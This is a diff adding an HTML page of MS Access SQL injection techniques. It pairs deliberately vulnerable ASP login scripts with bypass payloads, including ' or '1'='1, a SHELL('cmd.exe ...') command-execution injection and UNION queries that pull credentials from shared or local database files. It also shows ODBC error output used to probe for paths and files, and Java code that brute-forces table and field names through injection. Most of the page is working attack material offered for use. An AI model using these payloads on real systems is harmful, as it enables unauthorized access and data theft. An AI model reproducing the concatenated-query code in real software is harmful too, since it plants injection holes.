@@ -1,0 +1,180 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Scripts</title>
+</head><body>****************************************************************************<br/>
+% MS Access command execution, (older versions only)<br/>
+****************************************************************************<br/>
+[Auth Page Script]<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; user = request("user")<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pass = request("pass")<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Set Conn = Server.CreateObject("ADODB.Connection")<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Set Rs = Server.CreateObject("ADODB.Recordset")<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Conn.Open dsn<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; SQL = "SELECT * FROM users where pass='"&amp; pass &amp;"' and user='"&amp; user &amp; "'"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; rs.open sql,conn<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if rs.eof and rs.bof then<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ' Access Denied<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; else<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ' Access Allowed<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; end if<br/>
+<br/>
+[Auth Page Bypass]<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; user = |SHELL("cmd.exe /c dir &gt; c:\test.txt")|<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pass = test<br/>
+<br/>
+****************************************************************************<br/>
+% Auth Bypass, Basic<br/>
+****************************************************************************<br/>
+[Auth Page Script]<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; user = request("user")<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pass = request("pass")<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Set Conn = Server.CreateObject("ADODB.Connection")<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Set Rs = Server.CreateObject("ADODB.Recordset")<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Conn.Open dsn<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; SQL = "SELECT * FROM users where pass='"&amp; pass &amp;"' and user='"&amp; user &amp; "'"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; rs.open sql,conn<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if rs.eof and rs.bof then<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ' Access Denied<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; else<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ' Access Allowed<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; end if<br/>
+<br/>
+[Auth Page Bypass]<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; user = ' or '1'='1<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pass = test<br/>
+<br/>
+****************************************************************************<br/>
+% Auth Bypass, Simple<br/>
+****************************************************************************<br/>
+[Auth Page Script]<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; user = request("user")<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pass = request("pass")<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Set Conn = Server.CreateObject("ADODB.Connection")<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Set Rs = Server.CreateObject("ADODB.Recordset")<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Conn.Open dsn<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; SQL = "SELECT user,pass FROM users where user='"&amp; user &amp; "'"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; rs.open sql,conn<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if rs.eof and rs.bof then<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ' Access Denied<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; else<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (rs("pass") = pass) then<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ' Access Allowed<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ' Access Denied<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; end if<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; end if<br/>
+<br/>
+[Auth Page Bypass Using Shares]<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; user = ' union select name,password &nbsp;from table1 in '\\share\test\test.mdb<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pass = password that is set in \\share\test\test.mdb<br/>
+<br/>
+[Auth Page Bypass Local mdbs]<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; user = ' union select '0test','0test' from customers in<br/>
+'C:\winnt\Help\iisHelp\iis\htm\tutorial\eecustmr.mdb'<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pass = 0test<br/>
+<br/>
+[Union Notes]<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Remeber when using unions the sort order can affect the first record<br/>
+returned.<br/>
+<br/>
+****************************************************************************<br/>
+% System Path Disclosure<br/>
+****************************************************************************<br/>
+[Sql String]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; user = test' union select names from msysobjects in '.<br/>
+<br/>
+[ODBC Response]<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Microsoft OLE DB Provider for ODBC Drivers (0x80004005)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [Microsoft][ODBC Microsoft Access Driver] The Microsoft Jet database engine<br/>
+cannot<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; open the file 'C:\WINNT\system32'. It is already opened exclusively by<br/>
+another user,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; or you need permission to view its data.<br/>
+<br/>
+****************************************************************************<br/>
+% Verify File Exists<br/>
+****************************************************************************<br/>
+[Sql String - non-existant file]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; user = test' union select name from msysobjects in '\proof<br/>
+<br/>
+[ODBC Response]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Microsoft OLE DB Provider for ODBC Drivers (0x80004005)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [Microsoft][ODBC Microsoft Access Driver] Could not find file 'C:\proof'.<br/>
+<br/>
+[Sql String - existant]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; user = test' union select name from msysobjects in '\proof.txt<br/>
+<br/>
+[ODBC Response]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Microsoft OLE DB Provider for ODBC Drivers (0x80004005)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [Microsoft][ODBC Microsoft Access Driver] Unrecognized database format<br/>
+'C:\proof.txt'.<br/>
+<br/>
+****************************************************************************<br/>
+% Verify Path Exists<br/>
+****************************************************************************<br/>
+[Sql String - non-existant path]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; test' union select name from msysobjects in '\nopath\sqlerr<br/>
+<br/>
+[ODBC Response]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Microsoft OLE DB Provider for ODBC Drivers (0x80004005)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [Microsoft][ODBC Microsoft Access Driver] 'C:\nopath\sqlerr' is not a valid<br/>
+path.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Make sure that the path name is spelled correctly and that you are<br/>
+connected to the<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; server on which the file resides.<br/>
+<br/>
+[Sql String - existant path]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; user = test' union select name from msysobjects in '\inetpub\sqlerr<br/>
+<br/>
+[ODBC Response]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Microsoft OLE DB Provider for ODBC Drivers (0x80004005)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [Microsoft][ODBC Microsoft Access Driver] Could not find file<br/>
+'C:\inetpub\sqlerr'.<br/>
+<br/>
+****************************************************************************<br/>
+% Bruteforce Table Name<br/>
+****************************************************************************<br/>
+static private String columnErrorMessage = "...";<br/>
+static private String accessError = "...";<br/>
+<br/>
+[...]<br/>
+<br/>
+public String bruteTableName(Request r) { // 0<br/>
+<br/>
+&nbsp; &nbsp;String resp = new String();<br/>
+&nbsp; &nbsp;String[] table = { "tab_name1", "tab_name2", ..., "tab_nameN" }; // 1<br/>
+<br/>
+&nbsp; &nbsp;for(int i = 0; i &lt; table.length; i++) {<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; resp = sendInjection(r, " ' UNION SELECT 1 FROM " + table[i] + "%00"); // 2<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; if(resp.contains(columnErrorMessage) || !resp.contains(accessError)) // 3<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return table[i];<br/>
+&nbsp; &nbsp;}<br/>
+<br/>
+&nbsp; &nbsp;return null;<br/>
+}<br/>
+<br/>
+<b>bruteTableName()</b>&nbsp;takes as parameter (0) an object called "Request" (rappresenting the bugged request). The method tries to inject through <b>sendInjection()</b>&nbsp;(2) this query :<br/>
+<br/>
+' UNION SELECT 1 FROM table[i]%00<br/>
+<br/>
+Where table[i] is an element of a table name list (1). You can find a small wordlist at the end of this paper : it can be used for this purpose. At position (2), <b>sendInjection()</b>&nbsp;returns the html response after the sql code injection. If <b>resp</b>&nbsp;contains the <b>columnErrorMessage</b>&nbsp;string (3) you have found an existent table in the database. <b>columnErrorMessage</b>&nbsp;is a message that informs you that you used a different number of columns with UNION SELECT. This is why you don't need of the columns number : you can just check it to inference the table's existence. If the injectable query selects only one attribute/column, the code determinates the table name guessing with the second condition on <b>accessError</b>&nbsp;string (it's just the syntax error message mentioned above) : infact it will be displayed only if the table doesn't exist.<br/>
+<br/>
+****************************************************************************<br/>
+% Bruteforce Field Name<br/>
+****************************************************************************<br/>
+' UNION SELECT fieldName[j],1,1,1 FROM validTableName%00<br/>
+<br/>
+In this case you have to loop on an attribute names list (in the same way I propose in the code above). An attribute is guessed if the syntax error message doesn't appear in the html response. Here "j" is just an index of an ipotetical attributes list.</body></html>
